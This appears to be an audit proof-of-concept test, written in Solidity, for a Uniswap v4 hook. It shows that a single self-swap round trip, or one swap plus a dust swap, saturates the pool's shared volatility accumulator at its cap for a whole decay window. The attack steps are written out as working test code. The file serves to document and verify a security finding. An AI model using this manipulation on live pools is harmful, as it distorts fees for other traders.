// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";

import {HookTestBase} from "test/helpers/HookTestBase.sol";

/// @title PoC_HM09_SelfSwapPinsAccumulatorAtCap
/// @notice Harm assertion for HM-09, gen-2 scope: `FactoryHook._updateVolatility` adds the full
/// tick displacement of the previous swap to the accumulator with NO per-update ceiling — the
/// only clamp is the final saturation at `ACCUMULATOR_CAP`. One self-funded round trip therefore
/// drives the shared volatility reading straight to the cap, and `_decayedAccumulator` keeps it
/// elevated for a full `DECAY_WINDOW`. Since gen-2 the hook no longer maps volatility to a fee —
/// the reading is consumed by fee-calculator extensions — so the monetary harm assertions live
/// with the official `DynamicFeeExtension` (parity suite); what stays hook-level, asserted here,
/// is that a single actor can saturate the shared reading every extension consumes.
contract PoC_HM09_SelfSwapPinsAccumulatorAtCap is HookTestBase {
    PoolId internal poolId;
    address internal attacker;

    function setUp() public virtual override {
        super.setUp();
        _graduate(coin);
        poolId = _poolId(address(coin));
        attacker = users.buyerTwo;
    }

    /// @notice HARM: a single self-swap round trip pins the shared accumulator at the cap for a
    /// full decay window — every volatility-consuming extension on the pool sees maximum
    /// volatility with no market event beyond the attacker's own trades.
    function test_HM09_SelfSwapRoundTripPinsTheSharedVolatilityReading() public {
        assertEq(hook.getVolatility(poolId), 0, "pool starts quiet");

        // ---- The attack: one buy and one sell, both by the attacker, against themselves. No
        // counterparty, no information, no privileged role. ----
        _swapEthForCoin(address(coin), attacker, 1 ether);
        _swapCoinForEth(address(coin), attacker, IERC20(address(coin)).balanceOf(attacker));

        // HARM 1: the shared accumulator is saturated at the cap by one round trip. There is no
        // per-update displacement limit that would have damped it.
        assertEq(hook.getPoolState(poolId).volatilityAccumulator, hook.ACCUMULATOR_CAP(), "HARM: pinned at the cap");

        // HARM 2: the pin is not instantaneous — it decays over the whole window, so it shades
        // every reading in that window, not just the next one.
        vm.warp(block.timestamp + hook.DECAY_WINDOW() / 2);
        assertGe(hook.getVolatility(poolId), hook.ACCUMULATOR_CAP() / 2, "HARM: still elevated half a window later");
    }

    /// @notice The accumulator saturates from a SINGLE swap's displacement — the round trip is
    /// merely the cheapest way to book it, not a requirement.
    function test_HM09_SingleSwapDisplacementAlreadyExceedsTheCap() public {
        _swapEthForCoin(address(coin), attacker, 1 ether);

        // One swap's displacement alone already exceeds the cap, so the next swap sees it.
        assertEq(hook.getVolatility(poolId), hook.ACCUMULATOR_CAP(), "one swap saturates the reading");

        // And booking it into storage takes one more swap of any size, including dust.
        _swapEthForCoin(address(coin), attacker, 1e12);
        assertEq(
            hook.getPoolState(poolId).volatilityAccumulator,
            hook.ACCUMULATOR_CAP(),
            "HARM: dust swap books the cap into storage for a full decay window"
        );
    }
}
